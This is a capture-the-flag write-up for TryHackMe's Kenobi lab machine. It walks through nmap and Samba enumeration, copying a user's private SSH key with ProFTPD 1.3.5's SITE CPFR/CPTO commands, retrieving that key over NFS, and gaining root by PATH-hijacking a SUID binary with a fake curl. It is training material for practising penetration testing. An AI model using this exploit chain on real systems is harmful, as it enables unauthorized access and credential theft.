# [Kenobi](https://tryhackme.com/room/kenobi)

`Machine's IP - 10.10.216.38`

# Reconnaissance and Discovery
So, the first thing was to start out with a simple nmap scan and outputting the results to a log file.

`nmap -sS -sC -sV 10.10.216.38 > nmap-kenobi.log`

# Analyzing Information and Risks


```
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-25 18:39 PST
Nmap scan report for 10.10.216.38
Host is up (0.24s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      34480/udp6  mountd
|   100005  1,2,3      42484/udp   mountd
|   100005  1,2,3      44009/tcp   mountd
|   100005  1,2,3      51487/tcp6  mountd
|   100021  1,3,4      38433/tcp   nlockmgr
|   100021  1,3,4      39479/tcp6  nlockmgr
|   100021  1,3,4      41289/udp6  nlockmgr
|   100021  1,3,4      54063/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m00s, deviation: 3h27m51s, median: 0s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2020-11-25T20:40:20-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-11-26T02:40:20
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.47 seconds
```

NOTE: the website didn't have anything, it's a dead end.

So, I noticied right away Samba was being detected on the machine along with `FTP` and `SSH`. The first thing I tried was using the `ftp-anon.nse` to check if I could possibly get inside or finding something out.

```
PORT   STATE SERVICE
21/tcp open  ftp
```

But, as you can see, nothing. Then I tried enumerating the Samba shares with `Nmap`.

`nmap -p 445,139 10.10.216.38 --script=smb-enum-shares.nse,smb-enum-users.nse > nmap-kenobi-smbshares.log`

And I obtained the following

```
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-25 18:42 PST
Nmap scan report for 10.10.216.38
Host is up (0.28s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.216.38\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.216.38\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.216.38\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 36.67 second
```

The one that catched my eye was the `//10.10.216.38/anonymous` share and after typing enter it let me in which, to my surprise, had a file there. Quickly I fetched it into my local directory.

```
$ smbclient //10.10.216.38/anonymous
Enter WORKGROUP\diracspace's password: [ENTER]
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Sep  4 03:49:09 2019
  ..                                  D        0  Wed Sep  4 03:56:07 2019
  log.txt                             N    12237  Wed Sep  4 03:49:09 2019

		9204224 blocks of size 1024. 6875212 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (13.5 KiloBytes/sec) (average 13.5 KiloBytes/sec)
smb: \> exit
```

The next thing I tried was [Enum4Linux](https://github.com/CiscoCXSecurity/enum4linux). So, I started scanning but in the end it gave me the same info I had already found. Following the instructions at TryHackMe, I used `searchsploit` and found a few entries for the `ProFTPD 1.3.5` software. So, using `Netcat` I got inside and used the module that searchsploit mentioned to move user Kenobi's SSH key that we know is in his home directory. Since the FTP server is running as him, we are able to view the files without super user privileges.

```
$ nc 10.10.68.51 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.68.51]
SITE CPFR /home/kenobi/.ssh/id_rsa 
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

Then, we nead to get access to the `/var/tmp` directory to fetch the SSH key. What we need to do is mount the `/var` directory to an internal folder, like so

```
$ mkdir nfs && cd nfs
$ ls -la
total 52
drwxr-xr-x 14 root       root       4096 Sep  4  2019 .
drwxr-xr-x  1 diracspace diracspace  184 Nov 25 19:57 ..
drwxr-xr-x  2 root       root       4096 Sep  4  2019 backups
drwxr-xr-x  9 root       root       4096 Sep  4  2019 cache
drwxrwxrwt  2 root       root       4096 Sep  4  2019 crash
drwxr-xr-x 40 root       root       4096 Sep  4  2019 lib
drwxrwsr-x  2 root       staff      4096 Apr 12  2016 local
lrwxrwxrwx  1 root       root          9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root       crontab    4096 Sep  4  2019 log
drwxrwsr-x  2 root       mail       4096 Feb 26  2019 mail
drwxr-xr-x  2 root       root       4096 Feb 26  2019 opt
lrwxrwxrwx  1 root       root          4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root       root       4096 Jan 29  2019 snap
drwxr-xr-x  5 root       root       4096 Sep  4  2019 spool
drwxrwxrwt  6 root       root       4096 Nov 25 19:43 tmp
drwxr-xr-x  3 root       root       4096 Sep  4  2019 www
```

We then need to copy the key like so

```
$ cp /tmp/id_rsa ~/Documents/tryhackme/kenobi
$ cd ..
$ sudo umount nfs
```

Then, we can finally get inside

```
$ sudo ssh -i id_rsa kenobi@10.10.68.51
load pubkey "id_rsa": invalid format
The authenticity of host '10.10.68.51 (10.10.68.51)' can't be established.
ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.68.51' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ ls
share  user.txt
```

Here we were able to find the first flag or `user.txt`. We not need to elevate our privileges, I was going to try and enumerate my current sudo permissions but I don't have Kenobi's password. The next thing to see is that we can elevate the privileges with SUID Binaries. TryHackMe gave us the following command to enumerate the files and we can check with our filesystem to try finding the unusual ones.

```
$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

Using the `strings` command, we are able to see inside the binary and get little bits of information that we can use to our advantage. What I saw was that the binary made a cURL request to fetch some information in the current system, running bash level commands. 

Since the binary doesn't use direct routes to the other binary's that are commands, we can get a privilege escalation by rerouting the contents of `/bin/sh` to a file named `curl` in the `/tmp` directory. What this will do is that, when the request is being made it won't run the original `cURL` binary, but our `/bin/sh` shell as a root user. With this we can then display the contents of the final flag

```
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# whoami
root
# cd /root/
# ls 
root.txt
# cat root.txt
******************************
```

## License
[MIT](https://choosealicense.com/licenses/mit/)
